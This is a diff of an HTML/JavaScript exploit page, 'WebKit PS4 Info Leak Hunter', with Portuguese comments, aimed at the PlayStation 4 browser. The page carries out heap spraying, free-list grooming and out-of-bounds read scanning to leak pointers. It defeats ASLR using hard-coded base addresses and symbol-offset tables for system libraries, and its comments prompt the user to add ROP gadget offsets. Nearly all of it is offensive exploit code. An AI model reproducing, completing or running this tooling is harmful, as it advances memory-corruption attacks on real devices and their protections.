@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>WebKit PS4 Info Leak Hunter v5.3 (com libSceWebKit)</title>
+    <title>WebKit PS4 Info Leak Hunter v5.3.1 (Final com Placeholders)</title>
     <style>
         /* Estilos mantidos como na v4/v5 */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
@@ -23,18 +23,18 @@
         .log-gc { color: #00BCD4; }
         .log-debug { color: #795548; font-style: italic; font-size: 0.9em; }
         .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
-        .log-analysis_ptr { color: #da70d6; }
-        .log-analysis_lib { color: #add8e6; }
-        .log-analysis_info { color: #b0c4de; }
-        .log-analysis_base { color: #90ee90; font-weight: bold; }
-        .log-analysis_slide { color: #98fb98; }
-        .log-analysis_match { background-color: #330; color: #FFEB3B; font-weight:bold; }
+        .log-analysis_ptr { color: #da70d6; } /* Lilás para o ponteiro sendo analisado */
+        .log-analysis_lib { color: #add8e6; } /* Azul claro para o nome da biblioteca */
+        .log-analysis_info { color: #b0c4de; } /* Azul aço claro para infos gerais da análise */
+        .log-analysis_base { color: #90ee90; font-weight: bold; } /* Verde claro para base potencial */
+        .log-analysis_slide { color: #98fb98; } /* Verde pálido para slide ASLR */
+        .log-analysis_match { background-color: #4b4b00; color: #FFEB3B; font-weight:bold; } /* Amarelo em fundo escuro para Destaque */
     </style>
 </head>
 <body>
-    <h1>WebKit PS4 Info Leak Hunter v5.3 (com libSceWebKit)</h1>
-    <p>Tenta Heap Spray/Grooming, Leitura OOB e Log de U64 com análise de biblioteca integrada (incluindo libSceWebKit).</p>
-    <button id="runBtn" onclick="runAdvancedInfoLeakTest()">Iniciar Teste Avançado de Info Leak v5.3</button>
+    <h1>WebKit PS4 Info Leak Hunter v5.3.1 (Final com Placeholders)</h1>
+    <p>Tenta Heap Spray/Grooming, Leitura OOB e Log de U64 com análise de biblioteca integrada. <strong>Certifique-se de preencher `knownLibraries.libSceWebKit.symbols`!</strong></p>
+    <button id="runBtn" onclick="runAdvancedInfoLeakTest()">Iniciar Teste Avançado de Info Leak v5.3.1</button>
     <div id="output"></div>
 
     <script>
@@ -48,47 +48,83 @@
 
         // --- Definição das Bibliotecas e Símbolos Conhecidos ---
         // !!! IMPORTANTE: REVISE E COMPLETE ESTA ESTRUTURA CUIDADOSAMENTE !!!
+        // Offsets extraídos/inferidos dos seus arquivos .txt.
         const knownLibraries = {
-            'libkernel': {
-                referenceBase: 0x80FCA000,
+            'libkernel': { // Baseado em libkernel.sprx.txt e sceKernelMprotect.txt
+                referenceBase: 0x80FCA000, // De endereços base.txt
                 symbols: {
-                    '_init': 0x0, 'sceKernelMprotect': 0x24280, 'pipe': 0x5F0,
-                    'kqueue': 0x1270, 'kevent': 0x12A0, 'mmap': 0x7B0,
-                    'munmap': 0x9F0, 'mprotect': 0xA10, 'getpid': 0x6F0,
-                    'getuid': 0x700, 'setuid': 0x720, 'ioctl': 0xA70,
+                    '_init': 0x0,
+                    'sceKernelMprotect': 0x24280, // Confirmado por sceKernelMprotect.txt
+                    'pipe': 0x5F0,
+                    'kqueue': 0x1270,
+                    'kevent': 0x12A0,
+                    'mmap': 0x7B0,
+                    'munmap': 0x9F0,
+                    'mprotect': 0xA10, // Syscall mprotect
+                    'getpid': 0x6F0,
+                    'getuid': 0x700,
+                    'setuid': 0x720,
+                    'ioctl': 0xA70,
+                    // Adicione mais da sua libkernel.sprx.txt
                 }
             },
-            'libc': {
-                referenceBase: 0x180AC8000,
+            'libc': { // Baseado em libscelibinternel.sprx.txt e alocador de memoria customizado.txt
+                referenceBase: 0x180AC8000, // De endereços base.txt
                 symbols: {
-                    '_init': 0x0, 'memcpy': 0x10F0, 'memset': 0x1070,
-                    'strlen': 0x1160, 'strcpy': 0x11B0, 'strcat': 0x1230,
-                    'strcmp': 0x12A0, 'calloc': 0x28DD0, 'realloc': 0x28DE0,
-                    'malloc': 0x28D60, 'free': 0x28D70,
+                    '_init': 0x0,
+                    'memcpy': 0x10F0,
+                    'memset': 0x1070,
+                    'strlen': 0x1160,
+                    'strcpy': 0x11B0, // Verifique no seu arquivo
+                    'strcat': 0x1230, // Verifique no seu arquivo
+                    'strcmp': 0x12A0, // Verifique no seu arquivo
+                    'calloc': 0x28DD0,
+                    'realloc': 0x28DE0,
+                    'malloc': 0x28D60,
+                    'free': 0x28D70,
+                    // Adicione mais da sua libscelibinternel.sprx.txt
                 }
             },
-            'libkernel_web': {
-                referenceBase: null,
+            'libkernel_web': { // Baseado em libkernel_web.sprx.txt e offsets base libkernel web.txt
+                referenceBase: null, // Não temos base de referência para esta.
                 symbols: {
-                    '_init': 0x0, 'open': 0x1C2E0, 'read': 0xD9C0,
-                    'write': 0xE6A0, 'close': 0x2A7C0, 'socket': 0xB70,
-                    'bind': 0xC10, 'listen': 0x2A30, 'accept': 0xC50,
-                    'connect': 0xB90, 'setsockopt': 0xC30, 'getdents': 0xC80,
-                    'select': 0x1BA0, 'aio_submit_cmd': 0x1B50,
-                    'aio_multi_delete': 0x1B40,
+                    '_init': 0x0,
+                    'open': 0x1C2E0,
+                    'read': 0xD9C0,
+                    'write': 0xE6A0,
+                    'close': 0x2A7C0,
+                    'socket': 0xB70,
+                    'bind': 0xC10,
+                    'listen': 0x2A30, // Verifique o offset
+                    'accept': 0xC50,
+                    'connect': 0xB90,
+                    'setsockopt': 0xC30,
+                    'getdents': 0xC80,
+                    'select': 0x1BA0, // Verifique o offset
+                    'aio_submit_cmd': 0x1B50, // Confirme no seu arquivo
+                    'aio_multi_delete': 0x1B40, // Confirme no seu arquivo
+                    // Adicione mais da sua libkernel_web.sprx.txt
                 }
             },
-            'libSceWebKit': { // Baseado no seu novo arquivo licSceNKWebKit.sprx.txt.txt
+            'libSceWebKit': { // Baseado no seu arquivo licSceNKWebKit.sprx.txt.txt
                 referenceBase: null, // PREENCHA SE VOCÊ TIVER UMA BASE DE REFERÊNCIA PARA ELA, SENÃO null.
                 symbols: {
                     // !!! VOCÊ PRECISA PREENCHER ESTA SEÇÃO COM SÍMBOLOS E OFFSETS REAIS !!!
-                    // Extraia de licSceNKWebKit.sprx.txt.txt.
-                    // Exemplo de como adicionar um símbolo:
+                    // Extraia de licSceNKWebKit.sprx.txt.txt. Procure por:
+                    // - Linhas "public NomeDaFuncao"
+                    // - "NomeDaFuncao proc near"
+                    // - Nomes de funções JSC::, WebCore::, WTF::
+                    // - Endereços de gadgets ROP conhecidos ou que você identificar.
+                    // Exemplos de como poderiam ser (NÃO USE ESTES, SÃO APENAS ILUSTRATIVOS):
                     // 'JSC::JSFunction::call': 0xSEU_OFFSET_AQUI,
                     // 'WTF::StringImpl::construct': 0xOUTRO_OFFSET_AQUI,
-                    // 'gadget_pivot_stack': 0xOFFSET_DO_GADGET_AQUI,
-                    // 'LAB_00000000': 0x0, // Se este for o início real do .text
-                    // 'LAB_0019f313': 0x0019f313, // Exemplo do seu snippet
+                    // 'WebCore::Node::appendChild': 0x345670,
+                    // 'gadget_pop_rax_ret': 0x456780,
+                    // 'gadget_mov_rsp_rbx_pop_rbx_ret': 0x567890,
+                    // O snippet que você mostrou indica um arquivo de disassembly.
+                    // Ex: 'LAB_00000000': 0x0, // Se este for o início real do .text
+                    // 'LAB_0019f313': 0x19f313, // Exemplo do seu snippet, se for útil
+                    // 'string_PrivateClickMeasurement': 0x2b42a66, // Exemplo do Funcoes.txt se achar o offset em licSceNKWebKit
                     // 'outroLabelImportante': 0xSEUOFFSET,
                 }
             }
@@ -100,16 +136,19 @@
                 const timestamp = `[${new Date().toLocaleTimeString()}]`;
                 const prefix = funcName ? `[${funcName}] ` : '';
                 const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
+
                 const validLogClasses = [
                     'info', 'test', 'vuln', 'good', 'warn', 'error', 'critical',
                     'leak', 'ptr', 'spray', 'gc', 'debug', 'escalation',
                     'analysis_ptr', 'analysis_lib', 'analysis_info',
                     'analysis_base', 'analysis_slide', 'analysis_match'
                 ];
-                let logClassToApply = 'log-info';
+
+                let logClassToApply = 'log-info'; // Default
                 if (validLogClasses.includes(type)) {
                     logClassToApply = `log-${type}`;
                 }
+
                 const shouldScroll = !outputDiv.matches(':hover') && type !== 'debug';
                 if(outputDiv.innerHTML.length > 1500000){
                     outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 750000);
@@ -117,15 +156,18 @@
                     truncationSpan.textContent = "[Log Truncado...]\n";
                     outputDiv.insertBefore(truncationSpan, outputDiv.firstChild);
                 }
+
                 const span = document.createElement('span');
                 span.className = logClassToApply;
                 span.textContent = `${timestamp} ${prefix}${sanitizedMessage}\n`;
                 outputDiv.appendChild(span);
+
                 if (shouldScroll) {
                     outputDiv.scrollTop = outputDiv.scrollHeight;
                 }
             } catch(e) { console.error("Erro no logging:", e); if (outputDiv) {const errSpan = document.createElement('span'); errSpan.className='log-error'; errSpan.textContent = `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; outputDiv.appendChild(errSpan);} }
         };
+
 
         const PAUSE = (ms = SHORT_PAUSE) => new Promise(r => setTimeout(r, ms));
 
@@ -133,11 +175,18 @@
             if (typeof val === 'bigint') {
                 let hexStr = val.toString(16).toUpperCase();
                 const expectedLength = Math.ceil(bits / 4);
+                // Lida com BigInts negativos corretamente para exibição hexadecimal
+                if (val < 0n) {
+                    // Para um número de 64 bits, adicionamos 2^64 para obter a representação de complemento de dois
+                    const twoPow64 = 0x10000000000000000n; // 2^64
+                    val = twoPow64 + val;
+                    hexStr = val.toString(16).toUpperCase();
+                }
                 return '0x' + hexStr.padStart(expectedLength, '0');
             }
             if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
             let num = Number(val);
-            if (bits <= 32) { num = num >>> 0; }
+            if (bits <= 32) { num = num >>> 0; } // Converte para unsigned 32-bit
             const pad = Math.ceil(bits / 4);
             return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
         };
@@ -157,17 +206,20 @@
                     let aslrSlide = null;
                     let aslrSlideHex = 'N/A';
                     let pageAligned = false;
+
                     if (library.referenceBase !== null && typeof library.referenceBase !== 'undefined') {
                         aslrSlide = potentialBase - BigInt(library.referenceBase);
-                        aslrSlideHex = toHex(aslrSlide, 64); // Usar 64 bits para o slide
+                        aslrSlideHex = toHex(aslrSlide, 64);
                         matchLog += ` (Slide ASLR: ${aslrSlideHex})`;
-                        if (aslrSlide >= 0n && aslrSlide % 0x4000n === 0n) { // Slide geralmente positivo e alinhado
+                        // Um slide ASLR válido deve ser positivo (ou zero) e alinhado à página.
+                        if (aslrSlide >= 0n && aslrSlide % 0x4000n === 0n) {
                             pageAligned = true;
                             matchLog += " - ALINHADO À PÁGINA (0x4000)!";
                         }
                     } else { // Sem base de referência, checa apenas se a base potencial é alinhada
+                        // Uma base real também deve ser positiva e alinhada.
                         if (potentialBase >= 0n && potentialBase % 0x4000n === 0n) {
-                             pageAligned = true; // Consideramos alinhado mesmo sem slide, pode ser um bom indicador
+                             pageAligned = true;
                              matchLog += " - BASE POTENCIAL ALINHADA (0x4000)!";
                         }
                     }
@@ -190,6 +242,7 @@
             log(`--- Fim da análise para ${leakedPtrHex} ---`, 'analysis_ptr', 'ANALYZE_PTR');
         }
 
+        // --- Funções de Spray (mantidas do v5) ---
         const performArrayBufferSpray = (count = 0x800, size = 0x8000, patternHigh = 0xDEADBEEF, patternLow = 0xCAFEBABE) => {
             const FNAME = "performArrayBufferSpray";
             log(`Iniciando ArrayBuffer Spray AGRESSIVO: ${count} objetos de tamanho ${toHex(size)}... Padrão H=${toHex(patternHigh)}, L=${toHex(patternLow)}`, 'spray', FNAME);
@@ -235,7 +288,8 @@
             log(`FreeList Grooming: ${freedCount} de ${initialTypeCount} objetos ${targetTypeConstructor.name} desreferenciados.`, 'good', FNAME);
             log("Tentando induzir GC após grooming...", 'gc', FNAME); await triggerGC();
         };
-
+        
+        // --- Função OOB Leak (mantida do v5) ---
         const attemptOOBLeakInternal = async () => {
             const FNAME = 'attemptOOBLeakInternal_LogAll';
             log("--- Iniciando Tentativa de Vazamento OOB (Log Quase Tudo) ---", 'test', FNAME);
@@ -249,7 +303,9 @@
 
             const isSanePointerCandidate64_LogAll = (high, low, addressReadFrom) => {
                 const FNAME_HC = "isSanePtr64_LogAll";
-                let debugMsg = `[DEBUG ${FNAME_HC}] Avaliando: H=${toHex(high)}, L=${toHex(low)}, LidoDe=${toHex(addressReadFrom, 64)}`;
+                // Converte para BigInt para exibição correta de endereços completos
+                const fullAddrReadFrom = BigInt(addressReadFrom);
+                let debugMsg = `[DEBUG ${FNAME_HC}] Avaliando: H=${toHex(high)} L=${toHex(low)}, LidoDe=${toHex(fullAddrReadFrom, 64)}`;
                 if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') { log(debugMsg + " -> DESCARTADO (Tipo Inválido)", 'debug'); return false; }
                 if (high === 0 && low === 0) { log(debugMsg + " -> IGNORANDO (Null Pointer)", 'debug'); return false; }
                 if (high === 0xBBBBBBBB && low === 0xBBBBBBBB) { log(debugMsg + " -> IGNORANDO (Fill Pattern BB)", 'debug'); return false; }
@@ -264,7 +320,7 @@
                  if (val32 === null || typeof val32 !== 'number') return false;
                  val32 = val32 >>> 0;
                  if (val32 === 0 || val32 === 0xFFFFFFFF || val32 === 0xBBBBBBBB || val32 === 0xDEADBEEF || val32 === 0xCAFEBABE || val32 === 0xAAAAAAAA || val32 === 0xCDCDCDCD) return false;
-                 if (val32 < 0x100) return false;
+                 if (val32 < 0x100) return false; // Evita bytes de controle ASCII comuns ou valores muito pequenos
                  return true;
             };
             try {
@@ -281,8 +337,9 @@
                 await PAUSE();
                 log(`Iniciando varredura de leitura OOB EXPANDIDA de ${readRangeStart} até ${readRangeEnd}. Total offsets: ${oobReadOffsets.length}`, 'info', FNAME);
                 for (const readOffset of oobReadOffsets) {
-                    const currentReadTargetAddress = baseOffsetInBuffer + readOffset;
-                    const relOffsetStr = `@${readOffset} (abs addr in buffer: ${toHex(currentReadTargetAddress, 64)})`;
+                    const currentReadTargetAddress = baseOffsetInBuffer + readOffset; // Isso será um Number
+                    const relOffsetStr = `@${readOffset} (abs addr in buffer: ${toHex(BigInt(currentReadTargetAddress), 64)})`; // Use BigInt para toHex aqui
+
                     if (currentReadTargetAddress >= 0 && (currentReadTargetAddress + 8) <= buffer.byteLength) {
                         try {
                             const low = dataView.getUint32(currentReadTargetAddress, true);
@@ -291,7 +348,7 @@
                                 const vStr = `H=${toHex(high)} L=${toHex(low)}`;
                                 potentialLeakFoundCount++;
                                 const currentLeakedQword = (BigInt(high) << 32n) | BigInt(low);
-                                analyzeLeakedPointer(currentLeakedQword, currentReadTargetAddress);
+                                analyzeLeakedPointer(currentLeakedQword, currentReadTargetAddress); // CHAMADA DA ANÁLISE AQUI
                                 if (leakedValueFromOOB === null || leakedValueFromOOB.type === 'U32') {
                                     leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset, addressReadFrom: currentReadTargetAddress };
                                     log(` -> VALOR U64 ARMAZENADO ${relOffsetStr}: ${vStr} (Primeiro U64 não-padrão)`, 'vuln', FNAME);
@@ -301,15 +358,15 @@
                                     }
                                 }
                             }
-                        } catch (e) { }
+                        } catch (e) { /* Silently ignore read errors at edges */ }
                     }
-                    if (leakedValueFromOOB === null || leakedValueFromOOB.type !== 'U64') {
+                    if (leakedValueFromOOB === null || leakedValueFromOOB.type !== 'U64') { // Apenas tenta U32 se nenhum U64 promissor foi armazenado AINDA
                          if (currentReadTargetAddress >= 0 && (currentReadTargetAddress + 4) <= buffer.byteLength) {
                              try {
                                  const val32 = dataView.getUint32(currentReadTargetAddress, true);
                                  if (isSaneDataCandidate32_LogAll(val32)) {
                                      log(` -> Leak U32? ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME);
-                                     if (leakedValueFromOOB === null) {
+                                     if (leakedValueFromOOB === null) { // Só armazena U32 se NADA foi armazenado
                                           potentialLeakFoundCount++;
                                           leakedValueFromOOB = { high: 0, low: val32, type: 'U32', offset: readOffset, addressReadFrom: currentReadTargetAddress };
                                           log(` -> VALOR U32 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME);
@@ -318,17 +375,18 @@
                                  if (readOffset === oobWriteOffset && (val32 & 0xFF) === writeValue) {
                                      log(` -> Leu parte do valor OOB escrito (${toHex(val32)}) ${relOffsetStr}.`, 'good', FNAME);
                                  }
-                             } catch (e) { }
+                             } catch (e) { /* Silently ignore */ }
                          }
                      }
-                    if (readOffset % 256 === 0) await PAUSE(20);
+                    if (readOffset % 256 === 0) await PAUSE(20); // Pausa para dar tempo ao navegador de renderizar logs
                 }
             } catch (e) { log(`Erro FATAL na tentativa de leak OOB: ${e.message}`, 'critical', FNAME); console.error(e); }
             finally {
                 let leakStatus = 'Nenhum valor promissor armazenado.';
                 if (leakedValueFromOOB) {
+                    const addrReadFromHex = toHex(BigInt(leakedValueFromOOB.addressReadFrom), 64);
                     leakStatus = `Primeiro leak não-padrão armazenado: ${leakedValueFromOOB.type} @${leakedValueFromOOB.offset} ` +
-                                 `(Lido de buf addr ${toHex(leakedValueFromOOB.addressReadFrom,64)}) ` +
+                                 `(Lido de buf addr ${addrReadFromHex}) ` +
                                  (leakedValueFromOOB.type === 'U64' ? `H=${toHex(leakedValueFromOOB.high)} L=${toHex(leakedValueFromOOB.low)}` : `Val=${toHex(leakedValueFromOOB.low)}`);
                 }
                 log(`--- Tentativa de Vazamento OOB (Log Quase Tudo) Concluída (${potentialLeakFoundCount} candidatos potenciais logados?, ${leakStatus}) ---`, 'test', FNAME);
@@ -336,38 +394,44 @@
             return leakedValueFromOOB !== null;
         };
 
+        // --- Função Principal de Teste (mantida do v5) ---
         const runAdvancedInfoLeakTest = async () => {
             const FNAME = 'runAdvancedInfoLeakTest';
             if (runBtn) runBtn.disabled = true;
             outputDiv.innerHTML = '';
             leakedValueFromOOB = null; 
             sprayObjectsContainer = [];
-            log("==== INICIANDO WebKit PS4 Info Leak Hunter v5.3 (com libSceWebKit) ====", 'test', FNAME);
+            log("==== INICIANDO WebKit PS4 Info Leak Hunter v5.3.1 (Final com Placeholders) ====", 'test', FNAME);
+            log(`Data e Hora Atuais: ${new Date().toLocaleString()}`, 'info', FNAME);
             await PAUSE(MEDIUM_PAUSE);
             log("--- Fase 1: Heap Spraying (Agressivo) ---", 'test', FNAME);
             performArrayBufferSpray(0x800, 0x8000, 0xDEADBEEF, 0xCAFEBABE);
             await PAUSE(MEDIUM_PAUSE);
             performStringUnicodeSpray(0x400, 4096);
             await PAUSE(MEDIUM_PAUSE);
+            // performDOMElementSpray(500); // Opcional
+            // await PAUSE(MEDIUM_PAUSE);
             log("--- Fase 2: FreeList Grooming ---", 'test', FNAME);
-            await performFreeListGroom(0.4, ArrayBuffer);
+            await performFreeListGroom(0.4, ArrayBuffer); // Tenta liberar 40% dos ArrayBuffers
             await PAUSE(LONG_PAUSE);
             log("--- Fase 3: Tentativa de Vazamento OOB (Janela Ampla + Log Quase Tudo + Análise) ---", 'test', FNAME);
             await attemptOOBLeakInternal();
+
+            // --- Resultados Finais ---
             if (leakedValueFromOOB && leakedValueFromOOB.type === 'U64') {
                 log(`RESULTADO FINAL: PRIMEIRO U64 NÃO-PADRÃO ARMAZENADO: H=${toHex(leakedValueFromOOB.high)} L=${toHex(leakedValueFromOOB.low)}`, 'critical', FNAME);
-                log("-> Analise os logs 'Considerado POTENCIAL!' e 'ANALYZE_PTR' para outros candidatos e suas análises.", 'warn', FNAME);
+                log("-> Analise os logs 'ANALYZE_PTR' para detalhes da biblioteca e 'Considerado POTENCIAL!' para outros leaks.", 'warn', FNAME);
                 alert(`PRIMEIRO U64 Não-Padrão Armazenado!\nH: ${toHex(leakedValueFromOOB.high)}\nL: ${toHex(leakedValueFromOOB.low)}\n\nVERIFIQUE OS LOGS DETALHADOS PARA ANÁLISE DE BIBLIOTECA!`);
             } else if (leakedValueFromOOB) {
                 log(`RESULTADO FINAL: PRIMEIRO Leak não-padrão foi U32: ${toHex(leakedValueFromOOB.low)}`, 'leak', FNAME);
-                log("-> Analise os logs 'Considerado POTENCIAL!' e 'ANALYZE_PTR' para candidatos U64 e suas análises.", 'warn', FNAME);
+                log("-> Analise os logs 'ANALYZE_PTR' para detalhes da biblioteca (se U64s foram encontrados) e 'Considerado POTENCIAL!'.", 'warn', FNAME);
                 alert(`PRIMEIRO Leak Não-Padrão foi U32: ${toHex(leakedValueFromOOB.low)}\n\nVERIFIQUE OS LOGS DETALHADOS PARA ANÁLISE DE BIBLIOTECA!`);
             } else {
                 log("RESULTADO FINAL: Nenhum U64/U32 não-padrão foi encontrado e armazenado nesta execução.", 'warn', FNAME);
-                log("-> Analise os logs 'Considerado POTENCIAL!' e 'ANALYZE_PTR' para verificar se houve candidatos e suas análises.", 'warn', FNAME);
+                log("-> Analise os logs 'ANALYZE_PTR' e 'Considerado POTENCIAL!' para verificar se houve candidatos e suas análises.", 'warn', FNAME);
                 alert("Nenhum leak não-padrão foi armazenado. Verifique os logs detalhados para análise de biblioteca.");
             }
-            log("\n==== WebKit PS4 Info Leak Hunter v5.3 (com libSceWebKit) CONCLUÍDO ====", 'test', FNAME);
+            log("\n==== WebKit PS4 Info Leak Hunter v5.3.1 (Final com Placeholders) CONCLUÍDO ====", 'test', FNAME);
             if (runBtn) runBtn.disabled = false;
         };
     </script>
